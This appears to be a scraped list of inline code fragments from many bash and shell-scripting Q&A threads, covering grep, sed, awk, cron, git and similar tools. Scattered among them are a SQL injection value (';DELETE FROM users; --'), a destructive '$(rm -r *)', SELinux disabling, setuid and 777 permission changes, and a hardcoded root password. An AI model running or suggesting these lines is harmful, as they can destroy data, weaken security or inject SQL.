tput cols
column -c <n>
COLUMNS=$(tput cols) ls -C
COLUMNS=120 ls -C ...
<envVar>=<value> <commmand> ...
tput cols
tput cols
COLUMNS=$COLUMNS ls -C
1386d44b318730ffa98a34176d4e8b7eab8e02a4 ./Forensic Scripting 01 - Introduction to Developing Software and Shell Scripting (1).ppt 1386d44b318730ffa98a34176d4e8b7eab8e02a4 ./Forensic Scripting 01 - Introduction to Developing Software and Shell Scripting.ppt 2f4fc07ee944d666c34b0dfeeda90ad1c5cb9e71 ./kravica_waterfall_bosnia (copy).jpg 2f4fc07ee944d666c34b0dfeeda90ad1c5cb9e71 ./kravica_waterfall_bosnia.jpg 45f478cedd980ff2313f05fd0997a08492b9b21b ./canada-niagarafalls_-5 (another copy).jpg 45f478cedd980ff2313f05fd0997a08492b9b21b ./canada-niagarafalls_-5 (copy).jpg 45f478cedd980ff2313f05fd0997a08492b9b21b ./canada-niagarafalls_-5.jpg a3c6c5b749ce43cc3dade17230580b5ecf4d1557 ./frink (copy).png a3c6c5b749ce43cc3dade17230580b5ecf4d1557 ./frink.png d6039f1932dc2bb6fecfa41c02a7e9bc6656c621 ./UK - Associate Guide (Final Version -Effective Date 13 Feb 2012) (copy).pdf d6039f1932dc2bb6fecfa41c02a7e9bc6656c621 ./UK - Associate Guide (Final Version -Effective Date 13 Feb 2012).pdf
shopt -s globstar
for file in **; do
bash -c
find -exec
-exec command +
-exec command ;
-exec command +
xargs -0
brew install grace
in *
for files in *.gcount
ls -- -weirdly_named_file
sed '/starting line block/,/finishing line block/ /replace from here/,/stop replacing here/ s/hello/bye/g/'
sed -f <script> "$file"
file --mime-type
file -i
file -z
sudo yum install <python-package>
sudo pip install <python-package>
replace "ScriptPathPC=\Myfile\file_core" "ScriptPathPC=./file_core/" -- myfile.txt
grep -E "[a,b,c]*.[b]" /usr/share/dict/words
man grep
tr -d '\r'
echo "${array[@]}"
echo "${array[*]}"
mkdir fakemusic; touch fakemusic/{Beatles,Stone,Ramones,Doors}{001..199}; cd fakemusic
grep: out of memory
grep -f
if statements
if statement
seq 0 $(( ${#ARRAYEX[@]} - 1 ))
seq 0 $(( ${#ARRAYEX[@]} - 1 ))
--cmd qa
--cmd quit
+q +q
+q +q +q
sudo mkdir -p /data/db
drwxr-xr-x  X user  wheel  XXX Date Time /data/db/
exception in initAndListen: XXXXX Unable to create/open lock file: /data/db/mongod.lock errno:13 Permission denied Is a mongod instance already running?, terminating
chmod 777 /path/to/file
chmod 775 /path/to/file
chmod 775 /path/to/file
'+33. ... ... ..'
[ ._-]
grep -E
grep -E
+33. ... ... ..
bash /path/to/script/foo.sh
bash * * * * * '/path/to/script/foo.sh' &> /dev/null
find . -iname "*.plt" -exec ./gnuplotcd {} \;
chmod +x gnuplotcd
scp -r
#!/bin/bash --args blah blah
sed: -e expression #1, char 18: unknown option to 's'
(?= )
find /tmp/test/* -name "*.json" -exec python /python/path {} \;
/python/path/script.py /tmp/test/ '*.json'
chmod +x /python/path/script.py
>(tee -a _testoutput.txt)
> >(tee -a _testoutput.txt)
| tee -a _testoutput.txt
set -o pipefail
>( list )
header + file
tar tf
tar tf
crontab -e
man cron
(cron expression 2>&1) > /your/log/file
sleep 1
$(cat somejson | grep '\"fdsaf\"' | sed 's/  "fasdf": "\(.*\)",/\1/')
CV=trim `....`
cat somejson | grep '\"fdsaf\"' | sed 's/  "fasdf": "\(.*\)",/\1/'
val=foo() || val;
foo() { echo qux; }
< $1 >
myscript.sh param1 param2
alias homedir='cd /export/home/Files/myName'
ls -a
touch ~/.bashrc
vi ~/.bashrc
let "i++"
[ == value-of-all-n ]
git log --since --after={1.day.ago} --format="%h% B"
The system could not find the specified file
foo^ bar
for %i in ...
for %%i in ...
DIR4 = path of python, DIR2+dirname
/tt1, /tt2, /tt3
1.json, 2.json, 3.json
* * * * * /home/pi/siscat/isRunning.sh
udevadm info --attribute-walk --name=/dev/sdb1
tail /tmp/usb-key-nodes.log
$ ./script foo
echo $pass[0]
echo $pass[0]
cat -1 ... < iref.list
-e -i
a 3
a 11
awk '{print ...}'
a 3
a 5 7
a 2 4 9
a 2-5 7 11-
{print $1,$4,$7}
[ ! -e $1 ]
unzip -p
grep --color
((number += 1))
(( ... ))
echo $@
echo "$@"
printf '%s\n' "$@"
echo "$@"
echo "$@"
git commit
git rebase -i
echo $PARENT_PID
pgrep -P 1234
pgrep -P $PARENT_PID
pgrep -P
RESULT=$(paste <(echo "AddDescription") <(echo "$DESCRIPTION_VAR") <(echo "$PATH_VAR") -d ' ')
{ .. }
{ ... }
. /etc/bash_completion
test -f
[01/Apr/2015:22:31:21 +0200]
exec tclsh8.5 the_script.tcl "$vars"
find . -type d -name 'uploads'
editcfg -fil
editcfg -file 
editcfg -p
echo $1
echo $2
echo $$pos
Substring Expansion
$(echo ...)
xvkbd -xsendevent -string ...
(cmd1 & cmd2)
xargs -n 1
-n 1
-I XXX
{print $1}
zcat | grep
sudo -i 'bash -s'
read -u
tail -f
tr '[A-Z]' '[a-z]'
(treesave path indent) >> outfile.txt
" "
' '
$' '
man find
./InitSDX seed | less
./IniSDX | less
./InitSDX seed
InitSDX seed > log.txt > 2>&1
OSError: [Errno 25] Inappropriate ioctl for device
expression {action}
-v RS=
-v ORS=$'\n'
'NR==FNR{a=a $0 "\n"; next;}'
'/oldMethod/{print ORS a; next;}1'
mysqld_safe &
[ ... ]
"$flag1" = "C"
[[ ... ]]
[ ... ]
[[ ... ]]
[[ ... ]]
[ ... ]
apt-get install parallel
mv: target ‘2015-03-13’ is not a directory
ssh machine
"args $id "
tput cols
$ activate 9000
$ run 9000
name_goes_here 9002
sudo -E
Not able to use wildcards properly in if case.
chmod +x file
[[ ]]
0111 == 73
--inputbox "$(Description$count)
parallel -X
s/PBS/inserted line\nPBS/
git clone
git config --global core.autocrlf true
dos2unix install.sh
find [pattern] | xargs dos2unix
test ... -lt
cat env_prop |
date +%Y%m"01"
date +%Y%m"0"$(((9-$d)%7))
d=$(date -d "today 1300" '+%Y%m01'); w=$(date -d $d '+%w'); i=$(( (8 - $w) % 7)); answer=$(( $d + $i ));
echo $answer; echo $(date -d $answer '+%w')
for x in {1..100}; do d=$(date -d "+$x months 1300" '+%Y%m01'); w=$(date -d $d '+%w'); i=$(( (8 - $w) % 7)); answer=$(( $d + $i )); echo $answer; echo $(date -d $answer '+%w'); done | egrep -B1 '^[^1]$'
./main | ./another
pushd / popd
realpath .
realpath ../Bash/test
"$1" == "/"
sh.exe --login -i
man -k
wc -c
head -c $left
seq 1 $left
gnu awk
-e robots=off
eyeD3 -n 01 -a composer -t mainpiece piece 01*.mp3
mv 01*.mp3 01 [composer] mainpiece piece.mp3
printf ("%2d" ,$1,$2)
command | expand | sed -f foo.sed
chmod +x
source var_set.sh
$1 ~ regex
$1 ~ ENVIRON["regex"]
A && B
A & B
cpulimit --help
exec -a
cpulimit --help
bash -c
php stackoverflow-question.php
man bash
man bash
wc -l
fgrep -l -v FAILED
mogrify -path cropped -resize 1920x1440! $f
convert $f -resize
[ "$1"="$($line | grep ^$1)" ]
[[ "$line" =~ ^"$1" ]]
(( … ))
$(boot2docker shellinit)
$(boot2docker shellinit)
export a=b
export a=b
echo $BASH_VERSION
bash --version
echo $BASH_VERSION
echo $ID
func param1 param3
((ID+=req_ID ))
[[ ]]
[ .. ]
sudo useradd steam
vim css_update
sudo chmod +x css_update
tail -c1 "$f"
echo x
echo >> "$f"
limit 19
sudo -v
var1='.'; var2='sh'
sed 's/\*$/\ Yes/'
awk {'print "'$_dir/'"$9";"$5";"$2";"$1";"$10'}
declare -a
implicit none
docker run -it -d -p 43211:3000 --name appname -h hostname -v $PWD/local_dir:/root/remote_dir repo/imagename
BASH_VAR=$(docker run ...)
docker run --...>$FILE_DESCRIPTOR
awk -f script.awk data.txt
man chmod
man bash
./servo.sh: line 7: syntax error near unexpected token then'
./servo.sh: line 7:    if[ "$level" -eq 1 ]; then'
tr '\n' ' '
cut -d ' ' -f14
cut -d ' ' -f13
echo $(./known & ./unknown)
echo $(./known & time ./unknown > /dev/null)
echo $(./known & echo x$(./unknown))
typeset -f
typeset -p SKS
expr $N -1
- 1
$N - 1
$N -1
(?= 0$)
sed -n 1~2p
% 3
NR == 1
CREATE FOREIGN TABLE
set -x
<Server port="8081" ... >
ls -l
gnu awk
grep -c
cd /home/test/cs && ./hlds_run
cd /home/test/cs && ./hlds_run
cd /home/test/cs && ./hlds_run
sudo -u test sh -c "cd /home/test/cs && ./hlds_run"
passthru('sudo -u test sh -c "cd /home/test/cs && ./hlds_run"');
printf %q
line 10 [no: command not found
< /dev/tty
read word
cmd_array = ["mysql", "-t", "-u", "root", "-e", "show databases"]
seq -7.5 5 72.5 > my_file.txt
18 * * * * /home/bitnami/bash_script.sh
sass FILENAME.scss ../css/FILENAME.css
chmod u+x xx
./xx myscssfile
associative arrays
active_directory -v 1.6.0
tail +390 $0 > $outname
tail -n +390 $0 > $outname
shutdown -h -P now
(( <EXPRESSION> ))
[[ 3 < 21 ]]
sed s/\'/\\\'/ cards.json > cards_cleaned.json
sed s/\'/foobar/ cards.json > cards_cleaned.json
$ vi cards.json
diff -u
diff -u from.txt to.txt
end while
tr ',' "\n" < data.txt
-v OFS="\n"
service --status-all
[ ? ]
-c 70
while loop
cat file.txt | rev | cut -b 22- | rev | sort | uniq -c
cat file.txt | cut -d " " -f 1 | sort | uniq -c
sort -rn | head -n1
cat file.txt | rev | ...
rev file.txt | ...
mvn clean package
mvn clean
/ /
%Q{ code and "quote test indide" }
man grep
grep -P
grep -v -c
grep -Eo "^..(\s|$)" filename
for file in ./*.*; do ... $file...; done
PARAM1 PARAM22
PARAM11 PARAM3
sort -R
| sort ... |
sort -R
head ... | tail ...
head ... | tail ...
rl FILE | head -n NUM
curl $LINE
1 << i
1 << i
var$((i + 1))
OS X
bash script.sh
echo $SHLVL
ps faxww
echo 2nd=${b%)}
url => site
sed -r 's/[[:alnum:]]+=/\n&/g'
awk -F= '$1=="Var"{print $2}'
<<<"Input Here"
printf -v "${word%%=*}" %s "${word*=}"
printf -v
BEGIN { $/ = ""; }
myVar=$(some bash commands)
echo "$myVar"
myArray=( $(some bash commands) )
if [ "$event" = "Time Exceeded" ]  || [ "$event" = "Load Time" ];
cat $file | jq '.Event'
vim split_files.sh
cd my_folder
sh ../split_files.sh
find -print0
while read
while IFS= read
setopt shwordsplit
ls -1  |  sort -n | head -2000| xargs -I '{}' mv {} /folder/
square brackets
ssh ${DBSERVER} bash -
watch command1 command2
eval \$$t
bash -i
go run test.go
crontab -e
crontab -e
export EDITOR=nano
php /var/www/cron.php &
wget -O /dev/null http://example.com/cron.php
git log
git log --format
for $x in x:lines($raw) let $a:=tokenize($x,"\x09","!")
trap SIGKILL
sftp -vv
echo a > /tmp/foo
echo a > /tmp/foo && clear -n 1
tput cuu
tput sc
cut -f1 -d" "
sort -u
sort | uniq
/^DELTA Energy Terms/
^DELTA Energy Terms
{for(i=3;i<=NF;i++){split($i, a, /,/);print a[9]}}
print a[9]
DELTA Energy Terms
Energy Terms
tail -n +$((2 + $(grep -n "DELTA Energy Terms" input.txt
ps aux
grep "^myuser"
{{ var|yaml_encode|yaml_decode }}
/etc/init.d/postgresql start
RUN ["/bin/bash", "-c", "sudo touch /etc/apt/sources.list.d/pgdg.list"]
RUN ["/bin/bash", "-c", "/home/scrollback/install.sh"]
$(sudo echo $apt_source > /etc/apt/sources.list.d/pgdg.list)
var $password= 'sometext';
var $password= '
"\M-h": "\C-w"
sed -nl
"\eh": "\C-w"
make doc
WHERE IDS IN (<Result>)
-v OFS=","
NR>1 {}
f=(f?f OFS:"")$5
print f
w foo.txt
echo "$a"
< <(seq...)
seq 1 3
seq 3
false or $id == "valueA" or $id == "valueB"
"value in array"
rvmsudo passenger-status
nagios ALL=(ALL) NOPASSWD:/usr/lib/nagios/plugins/,/path/to/passenger-status
sudo visudo -f /etc/sudoers
sudo service nagios-nrpe-server restart
rvmsudo which passenger-status
CSI row ; column R
CSI 1 ; modifiers R
sort -g
sort -n
sort -ng
man ls
sudo -s
sudo -s
tr -d '\n'
tr -d '\r\n'
"He said: \"this is a direct quote.\""
s/\n/ /g
error: [Errno 48] Address already in use
lsof -n -i4TCP:1111 | grep LISTEN
foo=$(cat file)
echo $foo
echo "$foo"
echo $arrayname
for i in ${otherarray[@]}
/home/admin fileA
grep /home/admin
grep -w
f=`read filename`
read f
read -p filename: f
find $dir -type f
shopt -s nullglob
<a a>
pip freeze &gt; requirements.txt
pip freeze > requirements.txt
F3 F3 <space> C+n C+a F4
F3 F3 <space> C+n C+a F4
$(ls .)
for i in "$@"
git pull
fatal : Not a git repository (or any of the parent directories): .git
playlist_disable_highlight_delay = 0
help for
man bash
if [[ ${#} -eq 3 ]]; then
IFS=',' read -a mapping_value_array <<< "$mapping_values_param"
type_name=$(echo $map_value_item | cut -d":" -f1)
position parameters
indirect reference
$(whatever $ENV is)
Internal Field Separator
$' \t\n'
associative array
read -a mapping_value_array
0 1 2 3...
command substitution
echo $map_value_item | cut -d":" -f1
sudo crontab -e
-type d
-regex '.*/d_[0-9]+'
B command not found
grep -c
grep -c
sed -e 's/"$//g'
sed -e 's/^"//g'
sudo /path/to/my/erlang_script
setenforce 0
setenforce 1
useradd -r [blahblah]
help printf
grep -Fxq <?xml version....
while read
customize-variable org-babel-load-languages
customize-variable org-babel-load-languages
M-x list-packages
#+BEGIN_SRC bash
./configure --options --prefix=/home/chroot_env
chroot /home/chroot_env /bin/vmtoolsd
mount --bind /dev/ /home/chroot_env/dev/
ctrl + ad
ctrl + ad
awk -f script.awk file
debconf-set-selections <<< 'mysql-server mysql-server/root_password password 6ygr' ;debconf-set-selections <<< 'mysql-server mysql-server/root_password_again password 6ygr'; apt-get -y install  mysql-server
bash -c "cmd args ..."
echo "whatever" | command
-bash:  command not found
ls $(which git)
which git
which git
myCommand &
pgrep -f "elm"
ln -s /bin/bash /bin/sh
stty -a
ls | wc -l
vagrant up
-i 1.mp4 -i 2.mp4 -i 3.mp4 -i 4.mp4 -i 5.mp4 -i 6.mp4 -filter_complex '[0:0][0:1][1:0][1:1][2:0][2:1][3:0][3:1][4:0][4:1][5:0][5:1]concat=n=6:v=1:a=1:unsafe=1 [v] [a]' -map '[v]' -map '[a]' -aspect 16:9 -s 1280x720 -c:v mpeg4 -c:a libmp3lame -y track_0.mp4
No such filter: '''
ffmpeg $ARGS
ffmpeg -i 'my arg'
my arg
ffmpeg $ARGS
./calcgrade.sh $user
sudo -u someuser ./website/calcgrade.sh
su otheruser
su otheruser
sh yourscript
bash yourscript
git diff
git diff !(example)
git commit -v
command substitution
command substitution
oc -d data.txt
sed -i 's/\r$//' data.txt
bash -x yourscript.sh
eval "${CMD}"
data_directory "wonderful graph title"
CMD="/path/make_graph $ARGS"
/path/make_graph data_directory "wonderful graph title"
/path/make_graph data_directory "wonderful graph title"
eval "${CMD}"
/path/make_graph data_directory "wonderful graph title"
qsub [ options ] [ command | -- [ command_args ]]
"$1" "$2" ...
make_graph.pbs data_directory "wonderful graph title"
make_graph.pbs data_directory wonderful graph title
help echo
man sed
man seq
chapter 1 blah blah
blah num
chapter 1 blah blah
chapter 1
man grep
/usr/bin/awk -v n="$num" '/chapter:/ {f=0} /chapter: n/ {f=1} f' $file
uniq -c
$ PROGRAM_BIN
if [ "$b" = 2 ]
if [ "$b" -eq 2 ]
if [[ "$b" -eq 2 ]]
[ ]
(( b == 2 ))
#Second occurrence of Mylocation
sed -n '/^ *START=A *$/,/^ *END *$/p' yourfile
read -r -p ...
wc -w
sed ...
-l 23
wc -l
Task A
Task B
Task A
Task B
Task A
Task A
Task B
./filechk.sh < stuff
"${var: -1}"
help test
man stat
cut -c1-10,50-
./code1.sh www.bbc.com
there is no such a file or catalog like www.bbc.com
gnu awk
while [[ "$ENDPOINT_STATUS" != 0 && (( $COUNTER < 5 )) ]]
if [[ $COUNTER -lt 5 ]]
Bash tag
echo "$length"
echo "$file" >> $destinatie
yowsup-cli demos --s $1 \"$2\" -c yowsup/config
yowsup-cli demos --s $1 "$2" -c yowsup/config
echo "./yowsup/yowsup-cli demos --s $1 \"$2\" -c yowsup/config"
echo './yowsup/yowsup-cli demos --s $1 "$2" -c yowsup/config'
| sort
>> $destinatie
rm $destinatie
man sort
AWS_REGION: us-east-1
rails c
rails c
gem 'spring'
man open
r/s w/s
device_name=sda; interval=1; count=5
free buff cache
./h84a.sh fisier1.txt
read -r
[ "$wrd" = exit ] && break
kill -USR1 24962
http://www.bbc.com/  : invalid identifier
http://www.bbc.com/  : invalid identifier
read $1 $2
head -n
still logged on
-type f
line continuations
open file1.type file2.type
open *.type
open file1.type file2.type child1/file1.type child2/file1.type
open -? *.type
Could not open input file: /root/dir/file.php
wget https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=foo
403 Forbidden
grep -P
[1 2 3]
[1 1 1 1 2 2 2 2 3 3 3 3]
abc=('1%.0s' {1..4})
declare -a res=($(for v in 1 2 3; do for i in {1..4}; do echo $v; done; done))
replaced replaced replaced
foo bar baz
command not found: root
tail -f /var/log/apache or http/errorlogs
i.e a[$1] = 0
grep -i
-m 3
brandname build plugin
brandname build app
crontab -e
-vVAR=$(read -p ... )
system("echo ... |bc")
s | getline awk_var
specific ASCII string
syntax error: arithmetic expression required
man test
lld pic*
ls -l
ls -l
-d' '
xdotool key Right
xdotool key Left
-g ''
echo $filesToDelete
Bad substitution
echo $filesToDelete
rm -R $1
filesToDelete=(value1 value2 value3 value4)
max 4 chars + .
[[ ]]
[ "$res" -lt 0 ]
 bash
man 5 crontab
crontab -e
crontab FILENAME
crontab -l
man 1 crontab
xvkbd -window Firefox -text "\Cr"
man 5 crontab
pref("extensions.mozrepl.autoStart", false)
read -n1
read -N1
sudo chown root.root <my script>
sudo chmod 4755 <my script>
-rwxr-xr-x  1 root   root    851 Mar 23 21:14 runUpdates.sh*
command | grep error
grep -P -o ".//.{0,}"
.bashrc file
ls -1 | wc -l
compgen -v
complete -p
mycmd -o foo run ls ./Tab
else continue
let ...
declare -i
local -i
rm \
export -p
echo "USER: $USER"
intersectBed  -u -a $1$input_file1 -b $2$input_file2
wc $1$input_file1 | awk '{print $1"\t"$4}'
wc $2$input_file2 | awk '{print $1"\t"$4}'
chmod +x script
chmod a+x,go-w script
chmod 555 script
chmod 755 script
contains(@style, "fill:#000000")
grunt exec:start
./bar/hello world.cfg
firstname lastname
./zwmeter /dev/ttyUSB0 300
cp /dev/null
$ find /tmp/REPORTS/ -type f -exec cat /dev/null > {} \;
tar -xvf symlink1.tar.gz
tar -h -xvf symlink1.tar.gz
tar -h --no-overwrite-dir -xvf symlink1.tar.gz
tar -h --overwrite -xvf symlink1.tar.gz
tar -h --overwrite -xvJf symlink1.tar.xz
from a script
echo $list | egrep '^a[^aeiou]' | egrep '[0-9]{1,}'
echo "$list" | ...
python hello.py
SIZE=$(sed 's/M/ MB/' <<< ${SIZE});
$1 = $1
sed -i "1i node /^$server$/ inherits default {" "file.txt"
bash script
let i=1
let i="taco"
echo $((2 + 2))
echo $((6 % 3 == 0))
[ ... ]
$((a || b))
test.sh | tee -a /var/log/test.log
sed -i
cliclick -h
cliclick -h
cliclick -h
sort file
sort file > file
-c :sort -c :wq
sort -o "${filename}" "${filename}"
ls -lart ~/.bashrc ~/.bash_profile ~/.profile
bash: ls: command not found
'"[ ]"'
print $2
1st column value
3rd column value
3rd column value
$(($i * $RANDOM))
crontab -e
snapo@jump:~/mike/10$ cat 21.128
> editedtextfile.txt
-v var="$variable"
sed -n "/0 1/,$p" "$f" >> input.temp;
sed -n '/0 1/,$p' "$f" >> input.temp;
sed -n "/0 1/,\$p" "$f" >> input.temp;
-i inplace
baz [2] bar [1] foo [0]
baz [] bar [] foo []
f 2
f 2
executing f: 3
sleep 10&
PackageResourceViewer: Open Resource
for file in scale[1-9].dat
open -a /Applications/MyScanApp.app myargument
quoted form of
do shell script
$? $0 $1 $2 etc....
bash script.sh
set -- <arguments>
set -- ${_ARRAY[@]}
/* .... */
// ...
/* anything */
do commands
for ((expr;expr;expr))
pgrep -f /home/user/projects/c++/application/executable
pgrep -f /home/user/projects/c\+\+/application/executable
pgrep -f <pattern>
nano /usr/bin/sleep
pgrep -f /usr/bin/sleep
pgrep -f ^/usr/bin/sleep
grep -q
pgrep -x lxpanel
pidof lxpanel
ps -e -o command=
while read -r line; do ... done < <(ps ...)
[[ "${line}" == "${path}" || "${line}" == "${path} "* ]]
nano /usr/bin/sleep
pgrep -f /usr/bin/sleep
sleep 60s &
pidof /tmp/sleep
./myScript.sh 'searchString*'
./myScript.sh "searchString*"
var1=${line%/*}  and  var2=${line%.*}
for line in iter(p.stdout.readline,"")
$pathtosearch = /home/user
subprocess.call('samtools view -bS aln.sam > aln.bam', shell=True)
env -i bash --norc
echo $BASH_VERSION
set -e
ssh user@host "set -x; cd .; pwd; ls -lah; any command you want"
gzip -c
bash: /bin/sed: Argument list too long
sed -i 's%\(^\|[^:]\)//.*%\1%' file
free -m
set -x
Bash shell
tail -f
taif -f
$ tmux
$ tty
$ your-command 2>/dev/pts/N
>> output_file.txt
SET GLOBAL sql_mode
man rev
bash script.sh
sh script.sh
printf '\t'
syntax error: invalid arithmetic operator
(( arithmetic context ))
ls */*.tar
ls */*.tar | xargs -n1 tar xvf
chcp 1252
chcp.com 1252
bash -c
sh -c
if ; then
set -x
$(rm -r *)
echo $VAR
shc -T -f script
./script.x --help
sysctl -w kern.maxfiles=65000
ulimit -n
>/dev/null 2>&1
A && B || C
if A; then B; else C; fi
; then
grep -q
yourscript --help
yourscript -h
while ... shift
exit code
/etc/init.d/snortd00 start
start program = /etc/init.d/snortd00 start
start program = "/etc/init.d/snortd00 start"
set -xv
set +xv
set -xv
set -xv
[[ ... ]]
[ ... ]
[ ... ]
[[ ... ]]
[[ ... ]]
[[ ... ]]
[ ... ]
d=$(grep -oE '[0-9]{8}' <<<"$f"
(( n-- )) || break
which bash
sh filename
bash filename
"$(printf 'good' > $RESULTFILE)"
if diff -q $file1 $file2 >/dev/null; then echo same; else echo differ; fi
sed -ne '1~2{s/$/ : /;N;s/[",]\|\n //g;p}'
awk '{gsub(/[",]|^ */,"")} NR%2{printf $0 " : "} !(NR%2)'
C-b d
1 s/([^ ]+ ){2}/&: /g
([^ ]+ ){2}
echo date | bash
bash -i
echo $foo
echo $foo
Bash shell
tr -d
sed -i
Business Cards
Door Hanger
Business Card
Door Hanger
some-command 1>$myStdout 2>$myStderr
test.sh 1>log 2>&1
test.sh 1>log 2>log
test.sh 1>log 2>&1
test.sh 1>log 2>log
CPU temperature
while [ : ]
sleep 2
$(cat file)
read ENV_VAR <single_line_file
{ read line_1; read line2;} <file
pattern="2015-03-27"; if ! sort log.txt  | grep -nw "$pattern" -A1 -B1; then  echo "$pattern" | sort log.txt - | grep "$pattern" -A1 -B1 ; fi
pattern="2015-03-23"; if ! sort log.txt  | grep -nw "$pattern" -A1 -B1; then  echo "$pattern" | sort log.txt - | grep "$pattern" -A1 -B1 ; fi
set -e
sudo su
sudo -u
php -v
echo shell_exec('php -v');die();
$ php
$ which php
$ /opt/php5.6/bin/php
v16_line = 8
Parameter = R
cat -v
sudo -u user_name
PYTHONPATH env
echo -e "1\n2\n3" | { head -1; tail -1; } | xargs echo
1 3
if grep -q "something" $TFILE ; then
if [ $(grep -q "something" $TFILE) ] ; then 
hello world
[ ... ]
[[ ... ]]
[[ ... ]]
[ ... ]
test ...
[ ... ]
test ...
[ ... ]
[ -f "$stuff" ] # double-quoting required, if $stuff has embedded whitespace
[[ ... ]]
[[ ... ]]
[[ -f $stuff ]] # double-quoting optional
[[ ... ]]
[[ ... ]]
[[ ... ]]
[ ... ]
test ...
f='some file'; [[ -f $f ]]  # ok, double quotes optional
v='*'; [[ $v == '*' ]]      # ok, double quotes optional
[[ ... ]]
[[ abc == a* ]] && echo yes  # matches; use of = instead of == works too
v='a*'; [[ abc == "$v" ]] # does NOT match
[[ abc =~ ^a.+$ ]] && echo yes  # matches
v='a.+'; [[ abc =~ ^"$v"$ ]] # does NOT match
shopt -s compat31
[[ (3 -gt 2) && ! -f / ]] && echo yes
[[ ... ]]
[[ ... ]]
[[ ... ]]
[ ... ]
find -exec
grep -i "$@"
grep $1 "$@"
>(process substitution)
echo $sorted
echo $line
echo <variable> | grep -o "\s" | wc -l
declare -p var_name
echo "${myarray[@]}"
echo ${myarray[@]}
./scriptname start
echo $args
qemu $args
ls -R | awk '/<!--/,/-->/' >> result
awk '/<!--/,/-->/' >> result
<!-- some text here -->
ls -R
a=<1000> b=<$s3>
<<< "$s"
read a b <<< "$s"
line 5: !1: unbound variable
declare -a anArray=("${!1}")
declare -a anArray=("${!1}")
local anArray=("${!1}")
local anArray=("${!1}")
declare -a anArray=("${!1}")
unknown ---- BEGIN
$1: ambigious redirect" is displayed.
sudo apt-get install expect
expect heroku_login.exp
docker inspect foo
can't open file
man gzip
pr -2T
pack "\x41\x41"
pack "4141"
echo -e "\\x41\\x41"
echo -e "\x41\x41"
echo -en
exec yourshell
xterm -e yourshell
-F :
-i inplace
{ print }
{ print }
brew create
brew uninstall script
. ~/.bash_profile
source ~/.bash_profile.
grep -A 1
tail -n
'file1 file2'
set -xv
uniq -c
sort -n -r
NR==1 {prev=$1}
$1!=prev {exit}
{ print }
^ *[0-9]\{1,\}
uniq -c
TEST=test sh
env TEST="test"
(var1=val1 var2=val2 ...)
for i in $@; do
for i in "$@"; do
bash --version
bash -x findit.sh country young.iii fresh.txt little.iii
grep -hm1
wc -l
grep -l
--color auto
-P -e i
-P -e -i
%<optional modifiers><type>
200    200_filename.jpg
ls -lu
ls -lu /Users/jaro/documents/inc/face/
grep .
head -n 1 | rev | cut -d / -f1 | rev
Collection Service
getty (8)
foo bar
-v var=value
CTRL+ ->
CTRL + <-
bind -p
bind -p
-F ,
gawk -v var="$SOMEVALUE" '{FS = ":"; if($2<=var) print;}'
-F \;
{ [...] }
sort -t: -k2 -n
chown -R
chmod 775
-v RS='\n\n'
condition { action }
echo $PATH
/opt/mapr/server/configure.sh -C 10.60.63.6, 10.144.64.75, 10.226.98.24 -Z 10.226.98.24 -HS 10.226.98.24 -N MyCluster
sed: command not found
[ -d $PATH ]
-f filename.conf
tmux -d
"[^ ]{$k,}"
k=3; echo "$(egrep -co "[^ ]{$k,}" <<<$'abc\nde')"
0 2
egrep -co '[^ ]3'
egrep -co '[^ ]'
'[^ ]{'"$k"',}'
[^ ]{
[^ ]{4,}
cat $files |
{ips=ips "," $i}
awk -f filename.awk filename.txt
awk -f filename.awk filename.txt >> output.txt
protocol tags
[ $ln -gt 66 ]
read -r
cat data.dat | awk '{ print $2 }' > new_data.dat
{arrayelements [*]}
screen -S session-name
screen -ls
git log
git log
git log
git log
git log
git log
cat fname |
cat one_file_name
cat file_*
ls -1| sort -n |xargs -i cat {} >> file.out
xargs cat
process substitution
illegal field $()
awk -F'[:,]' -v u1=$5 -v v1=$6 -v u2=$7 -v v2=$8 \ '{ print "u1 =", $u1 }' $1
./myProgram myFile.txt 1 2 3 4
baz,"qux "
export -f
export -f
for i in *;
sort -nr
/#define asdasd/
"$(< $FILE)"
pwd | open
ls | open -f
pwd | open -f
pwd | xargs open
pwd | xargs open
printf '%s\0' "$PWD"
xargs -0
printf '%s' "$PWD" | xargs -I % open %
$(< file)
$(cat file)
$(< /dev/fd/0)
cd.. && cd project_directory
shopt -s extdebug ; declare -F cd
cd 14 /Users/imclean/.rvm/scripts/cd
cd .
col="<name of column to use>"
bash -c
echo -en "Some text containing æøåÆØÅ"|hexdump -v -e '"xx" 1/1 "%02X"
find | loop
loop < <(find)
read -r
bash -c
sh -c
South Dakota
West Virginia
awk '/b/,/d/' file
-o, --only-matching
No such file or directory
quoted form of
quoted form of
quoted form of
quoted form of
> outputFile
do shell script
do shell script
> outFile
quoted form of
'sed s/foo/bar/g file'
sed s/foo/bar/g file
grep -qi
ls -l
ls -l
setopt multios
setopt nomultios
a=$1 fi
sort -n -r numbers.txt | tail -n1
sort -n -r numbers.txt | head -n1
cut -d " " -f 1 sample.dat
Attach to process
a b c d ... y z
a b c d ... y z
rm: cannot remove file1: No such file or directory
x & y
Couldn't resolve host
5 10 15
set -x
cd -P
test -L
readlink -f $LINK
greadlink -f $LINK
$> cd $DIR/tools/
test chat
composer require zyberspace/telegram-cli-client
test chat
while (true): /*code*/ endwhile;
command parameter1
ls -l
read -r -d $'\0'
echo "a\0b\0c\0" | while read -r  -d $'\0'  var; do echo $var; done
$value == "RaftArgs"
print i++
Find And Replace This
-maxdepth N
zip -T $file && echo "OK" >> wynik.txt || echo "BAD" >> wynik.txt
lsof -a -p
[[ "$variable" = "Device" ]]
while read -r name value
echo -n "$line"
0 10 * * * /tmp/ssh-abc/KKK/Report.sh
Tried giving cd and path and then the command in crontab but seems not working
git checkout -f
git tag
basename $0
xargs --version
NR % 3
{ ORS = (NR % 3 == 1 ? " " : "\n")
gsub("^[[:blank:]]+|[[:blank:]]*\r?$", "")
{ print (NR % 3 == 0 ? "State: " : "") $0 }
for file; do
for file in "$@"; do
man bash
echo $PATH
read -s
eval $(ssh-agent)
. add_key.sh
git rm -r --cache
git add remote <ssh-repo/core.git & demos.git>
if [ ! -z $pov] then  .../shell to execute using $pov... fi
uniq -c
uniq -c
git push live master
git describe
echo $(git describe)
fatal: No names found, cannot describe anything.
git push live --tags
;DELETE FROM users; --
";DELETE FROM users; --"
while getopts
while read
awk '...' file > tmp && mv tmp file
awk -i inplace '...' file
most my_big_file
(declare -n)
gradle androidPublish
-F ': *'
: *
-v filter=value
echo $VAR1
echo $VAR2
NOL=$(wc -l < /home/usrname/nodes.txt)
<( knife client list )
cd $(echo "$input_path")
cd my path
